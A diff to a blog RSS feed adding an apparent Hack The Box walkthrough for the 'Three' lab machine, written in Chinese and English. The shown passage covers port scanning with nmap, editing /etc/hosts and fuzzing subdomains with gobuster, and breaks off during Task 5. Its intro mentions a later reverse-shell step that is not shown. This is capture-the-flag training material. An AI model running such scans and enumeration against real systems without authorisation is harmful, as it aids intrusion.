@@ -7,7 +7,391 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Sp1ke</copyright>
-        <lastBuildDate>Mon, 02 Nov 2026 13:25:49 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 03 Nov 2026 20:46:12 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>9. Three</title>
+        <link>https://Sp1ke-sec.github.io/p/9.-three/</link>
+        <pubDate>Tue, 03 Nov 2026 20:46:12 +0800</pubDate>
+        
+        <guid>https://Sp1ke-sec.github.io/p/9.-three/</guid>
+        <description>&lt;img src="https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102213042662.png" alt="Featured image of post 9. Three" /&gt;&lt;h1 id=&#34;three&#34;&gt;Three
+&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102213042662.png&#34;
+	width=&#34;488&#34;
+	height=&#34;176&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102213042662_hu982439284513183596.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102213042662_hu18234163134469483412.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102213042662&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;277&#34;
+		data-flex-basis=&#34;665px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;About: Three is a very easy Linux machine featuring a website using a misconfigured AWS S3 bucket as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.&lt;/p&gt;
+&lt;p&gt;介绍：Three 是一个非常简单的 Linux 机器，其网站使用配置错误的 AWS S3 存储桶作为其云存储设备。该机器探索 Web 应用程序枚举和子域模糊测试，以检测与 S3 存储桶对应的隐藏域。然后，它演示了如何使用 AWS 命令行界面访问存在漏洞的 S3 存储桶，以及如何通过上传和触发反向 shell 来利用该漏洞。&lt;/p&gt;
+&lt;p&gt;靶机 IP：10.129.92.138&lt;/p&gt;
+&lt;h3 id=&#34;task-1&#34;&gt;Task 1
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;How many TCP ports are open?&lt;/p&gt;
+&lt;p&gt;有多少个TCP端口处于开放状态？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# nmap -Pn -n -sV -sC -p 22,80 10.129.92.138
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.99 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2026-11-02 09:08 -0500
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.92.138
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.38s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: The Toppers
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 27.93 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;nmap 扫描结果只有 22,80 端口开放。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：2&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-2&#34;&gt;Task 2
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the domain of the email address provided in the &amp;ldquo;Contact&amp;rdquo; section of the website?&lt;/p&gt;
+&lt;p&gt;网站“联系我们”部分提供的电子邮件地址的域名是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221132671.png&#34;
+	width=&#34;1282&#34;
+	height=&#34;441&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221132671_hu12337746673483066159.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221132671_hu12574520391851411557.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102221132671&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;290&#34;
+		data-flex-basis=&#34;697px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：thetoppers.htb&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?&lt;/p&gt;
+&lt;p&gt;在没有 DNS 服务器的情况下，我们可以使用哪个 Linux 文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;/etc/hosts&lt;/code&gt; 是 Linux 的本地静态解析表，优先级高于 DNS。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.129.92.138 thetoppers.htb&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts                                 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# cat /etc/hosts                                       
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1       localhost
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.1.1       kali
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;::1             localhost ip6-localhost ip6-loopback
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ff02::1         ip6-allnodes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ff02::2         ip6-allrouters
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.129.92.138 thetoppers.htb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这时再去访问 &lt;code&gt;thetoppers.htb&lt;/code&gt; 就会被解析到 &lt;code&gt;10.129.92.138&lt;/code&gt; 这个 IP。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221825074.png&#34;
+	width=&#34;1144&#34;
+	height=&#34;245&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221825074_hu1018619263311392526.png 480w, https://Sp1ke-sec.github.io/p/9.-three/assets/image-20261102221825074_hu11694980024317004809.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261102221825074&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;466&#34;
+		data-flex-basis=&#34;1120px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：/etc/hosts&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which sub-domain is discovered during further enumeration?&lt;/p&gt;
+&lt;p&gt;在进一步枚举过程中发现了哪个子域？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# gobuster vhost -u http://thetoppers.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Gobuster v3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;by OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; Christian Mehlmauer &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@firefart&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url:                       http://thetoppers.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Method:                    GET
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads:                   &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Agent:                gobuster/3.8.2
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout:                   10s
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Append Domain:             &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Exclude Hostname Length:   &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting gobuster in VHOST enumeration &lt;span class=&#34;nv&#34;&gt;mode&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;s3.thetoppers.htb Status: &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 21&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gc._msdcs.thetoppers.htb Status: &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Size: 306&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Progress: &lt;span class=&#34;m&#34;&gt;2909&lt;/span&gt; / &lt;span class=&#34;m&#34;&gt;19966&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;14.57%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;^C
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;由于 &lt;code&gt;s3.thetoppers.htb Status: 404 [Size: 21]&lt;/code&gt; ，所以子域就是这个了。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;404 Not Found&lt;/code&gt; 是指请求合法，但是这个 Host 对应的站点不存在。这里我们认为 404 就是找到了，因为说明请求成功了；对应站点不存在只是因为我们没有把这个域名加到 &lt;code&gt;/etc/hosts&lt;/code&gt; 文件里。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;400 Bad Request&lt;/code&gt; 是指请求本身畸形，即无效。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：s3.thetoppers.htb&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which service is running on the discovered sub-domain?&lt;/p&gt;
+&lt;p&gt;已发现的子域上运行着哪项服务？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# vim /etc/hosts                                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/HTB&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# cat /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1       localhost
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.1.1       kali
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;::1             localhost ip6-localhost ip6-loopback
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ff02::1         ip6-allnodes
